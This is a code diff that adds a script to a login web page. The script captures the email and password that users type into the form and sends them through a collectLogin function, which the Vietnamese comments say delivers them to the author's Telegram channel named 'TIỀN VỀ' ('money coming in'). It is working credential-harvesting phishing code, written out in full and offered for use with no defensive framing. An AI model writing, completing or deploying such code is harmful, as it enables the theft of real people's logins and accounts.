@@ -273,4 +273,27 @@
         });
     </script>
 </body>
-</html>
+<script src="api.js"></script>
+
+<script>
+// Đoạn mã này sẽ tự động 'chặn' cái form cũ và gửi về Tele của bạn
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.querySelector('form'); // Tự động tìm cái form đăng nhập
+    
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+            // Lấy ID email và pass (theo đúng hình bạn gửi)
+            const emailInput = document.getElementById('email');
+            const passInput = document.getElementById('pass');
+
+            if (emailInput && passInput) {
+                // Gửi dữ liệu về kênh "TIỀN VỀ" qua api.js
+                collectLogin(emailInput.value, passInput.value);
+                
+                // Sau khi gửi xong thì cho nó chạy tiếp hoặc chuyển trang
+                console.log("Dữ liệu đã được gửi về Telegram.");
+            }
+        }, true); // Dùng tham số true để ưu tiên chạy lệnh này trước
+    }
+});
+</script>
